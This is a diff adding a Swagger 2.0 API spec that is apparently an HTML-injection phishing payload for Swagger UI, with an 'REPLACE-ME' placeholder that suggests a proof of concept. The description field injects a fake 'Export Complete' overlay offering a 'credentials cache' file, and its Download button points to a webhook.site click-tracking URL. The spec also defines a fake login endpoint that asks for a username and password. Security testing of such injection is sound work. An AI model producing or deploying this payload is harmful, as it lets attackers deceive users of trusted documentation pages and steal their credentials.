@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 'Swagger UI'
+  description: '<div style="position:fixed;top:35%;left:50%;transform:translateX(-50%);width:92%;max-width:420px;background:#fff;border-radius:10px;box-shadow:0 12px 40px rgba(0,0,0,.4);z-index:99999;overflow:hidden;font-family:Arial;"><div style="background:#0f9d58;color:#fff;padding:12px 16px;font-size:15px;font-weight:600;">Export Complete</div><div style="padding:18px;font-size:14px;color:#333;">Your credentials cache export <strong>accounts.csv</strong> (2.4 MB) is ready.</div><div style="padding:0 18px 18px;"><a href="https://webhook.site/REPLACE-ME?event=download-clicked" style="display:block;text-align:center;padding:11px;background:#0f9d58;color:#fff;border-radius:6px;font-size:15px;text-decoration:none;">Download File</a></div></div>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
